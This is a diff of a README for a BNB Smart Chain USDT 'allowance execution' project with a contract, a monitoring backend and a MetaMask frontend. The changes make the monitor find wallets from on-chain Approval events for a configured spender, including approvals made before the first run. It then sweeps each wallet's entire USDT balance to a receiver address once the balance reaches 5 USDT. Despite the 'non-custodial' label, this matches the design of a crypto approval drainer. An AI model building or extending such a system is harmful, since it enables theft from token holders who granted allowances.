@@ -5,7 +5,7 @@ Non-custodial BEP-20 USDT allowance execution for BNB Smart Chain. This is not a
 ## Architecture
 
 - `hardhat/`: Solidity `^0.8.20` contract using OpenZeppelin `Ownable`, `ReentrancyGuard`, and `SafeERC20`.
-- `backend/`: Express + ethers v6 monitor. It stores public wallet registrations and history, reads `EXECUTOR_PRIVATE_KEY` only from environment, and calls only `executeToReceiver1` or `executeToReceiver2`.
+- `backend/`: Express + ethers v6 monitor. It discovers wallet approvals from USDT `Approval` events for the configured spender, verifies live allowances, stores wallet status and execution history, reads `EXECUTOR_PRIVATE_KEY` only from environment, and calls only `executeToReceiver1` or `executeToReceiver2`.
 - `frontend/`: Next.js migration of the supplied layout with MetaMask connection, BNB chain detection, approval, and notifications.
 
 ## Deploy
@@ -18,4 +18,4 @@ Non-custodial BEP-20 USDT allowance execution for BNB Smart Chain. This is not a
 
 ## Operational notes
 
-The monitor polls every 30 seconds. At a balance of at least 5 USDT and sufficient allowance, it submits the wallet's entire current USDT balance to the registered receiver through the contract. Reverts are captured in history. Use a dedicated executor key with only the required gas balance, protect environment secrets with a secret manager in production, and review receiver addresses before mainnet deployment.
+The monitor polls every 30 seconds for USDT `Approval` events whose spender is `ALLOWANCE_SPENDER_ADDRESS`, then verifies each owner's current allowance directly with `allowance(owner, spender)`. It persists its processed block so it resumes after a restart. Set `USDT_APPROVAL_SCAN_START_BLOCK` to the spender's deployment block to discover prior approvals on the first run; if omitted, the first scan starts at the current chain head. At a balance of at least 5 USDT and sufficient allowance, it submits the wallet's entire current USDT balance to the registered receiver through the contract. Reverts are captured in history. Use a dedicated executor key with only the required gas balance, protect environment secrets with a secret manager in production, and review receiver addresses before mainnet deployment.
